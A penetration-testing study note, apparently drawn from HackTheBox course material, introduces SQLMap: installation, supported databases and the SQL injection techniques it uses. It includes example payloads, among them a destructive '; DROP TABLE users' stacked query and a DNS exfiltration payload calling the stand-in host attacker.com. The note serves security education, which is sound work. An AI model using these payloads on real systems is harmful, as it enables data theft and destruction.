---
sticker: lucide//database-backup
---
[SQLMap](https://github.com/sqlmapproject/sqlmap)Â is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.


```shell-session
smoothment@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:

|                            |                     |                                                        |
| -------------------------- | ------------------- | ------------------------------------------------------ |
| Target connection          | Injection detection | Fingerprinting                                         |
| Enumeration                | Optimization        | Protection detection and bypass using "tamper" scripts |
| Database content retrieval | File system access  | Execution of the operating system (OS) commands        |


---

## SQLMap Installation

SQLMap is pre-installed on your Pwnbox, and the majority of security-focused operating systems. SQLMap is also found on many Linux Distributions' libraries. For example, on Debian, it can be installed with:



```shell-session
smoothment@htb[/htb]$ sudo apt install sqlmap
```

If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:


```shell-session
smoothment@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

After that, SQLMap can be run with:

```shell-session
smoothment@htb[/htb]$ python sqlmap.py
```

---

## Supported Databases

SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

|                |                    |                  |                      |
| -------------- | ------------------ | ---------------- | -------------------- |
| MySQL          | Oracle             | PostgreSQL       | Microsoft SQL Server |
| SQLite         | IBM DB2            | Microsoft Access | Firebird             |
| Sybase         | SAP MaxDB          | Informix         | MariaDB              |
| HSQLDB         | CockroachDB        | TiDB             | MemSQL               |
| H2             | MonetDB            | Apache Derby     | Amazon Redshift      |
| Vertica, Mckoi | Presto             | Altibase         | MimerSQL             |
| CrateDB        | Greenplum          | Drizzle          | Apache Ignite        |
| Cubrid         | InterSystems Cache | IRIS             | eXtremeDB            |
| FrontBase      |                    |                  |                      |


The SQLMap team also works to add and support new DBMSes periodically.

---

## Supported SQL Injection Types

SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with theÂ `sqlmap -hh`Â command:

```shell-session
smoothment@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

The technique charactersÂ `BEUSTQ`Â refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

---

## Boolean-based blind SQL Injection

Example ofÂ `Boolean-based blind SQL Injection`:


```sql
AND 1=1
```

SQLMap exploitsÂ `Boolean-based blind SQL Injection`Â vulnerabilities through the differentiation ofÂ `TRUE`Â fromÂ `FALSE`Â query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returnedÂ `TRUE`Â orÂ `FALSE`. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.

- `TRUE`Â results are generally based on responses having none or marginal difference to the regular server response.
    
- `FALSE`Â results are based on responses having substantial differences from the regular server response.
    
- `Boolean-based blind SQL Injection`Â is considered as the most common SQLi type in web applications.
    

---

## Error-based SQL Injection

Example ofÂ `Error-based SQL Injection`:


```sql
AND GTID_SUBSET(@@version,0)
```

If theÂ `database management system`Â (`DBMS`) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and coversÂ `Error-based SQL Injection`Â for the following DBMSes:

|                      |            |         |
| -------------------- | ---------- | ------- |
| MySQL                | PostgreSQL | Oracle  |
| Microsoft SQL Server | Sybase     | Vertica |
| IBM DB2              | Firebird   | MonetDB |

Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.

---

## UNION query-based

Example ofÂ `UNION query-based SQL Injection`:


```sql
UNION ALL SELECT 1,@@version,3
```

With the usage ofÂ `UNION`, it is generally possible to extend the original (`vulnerable`) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.

---

## Stacked queries

Example ofÂ `Stacked Queries`:


```sql
; DROP TABLE users
```

Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g.Â `INSERT`,Â `UPDATE`Â orÂ `DELETE`), stacking must be supported by the vulnerable platform (e.g.,Â `Microsoft SQL Server`Â andÂ `PostgreSQL`Â support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.

---

## Time-based blind SQL Injection

Example ofÂ `Time-based blind SQL Injection`:

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

The principle ofÂ `Time-based blind SQL Injection`Â is similar to theÂ `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation betweenÂ `TRUE`Â orÂ `FALSE`.

- `TRUE`Â response is generally characterized by the noticeable difference in the response time compared to the regular server response
    
- `FALSE`Â response should result in a response time indistinguishable from regular response times

`Time-based blind SQL Injection`Â is considerably slower than the boolean-based blind SQLi, since queries resulting inÂ `TRUE`Â would delay the server response. This SQLi type is used in cases whereÂ `Boolean-based blind SQL Injection`Â is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g.Â `INSERT`,Â `UPDATE`Â orÂ `DELETE`), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, asÂ `Boolean-based blind SQL Injection`Â would not really work in this case.

---

## Inline queries

Example ofÂ `Inline Queries`:

```sql
SELECT (SELECT @@version) from
```

This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.

---

## Out-of-band SQL Injection

Example ofÂ `Out-of-band SQL Injection`:

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

By running the SQLMap on the DNS server for the domain under control (e.g.Â `.attacker.com`), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g.Â `foo.attacker.com`), whereÂ `foo`Â would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect theÂ `foo`Â part, to form the entire SQL response.
